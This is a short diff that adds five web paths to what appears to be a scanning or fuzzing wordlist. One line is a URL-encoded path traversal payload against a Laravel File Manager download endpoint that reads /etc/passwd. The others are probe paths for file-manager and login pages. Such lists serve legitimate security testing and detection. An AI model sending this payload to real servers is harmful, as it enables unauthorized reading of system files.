@@ -1,0 +1,5 @@
+/laravel-filemanager/download?working_dir=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2F&type=&file=passwd
+/kfm/index.php
+/laravel-filemanager?type=Files
+/index.php
+/Login
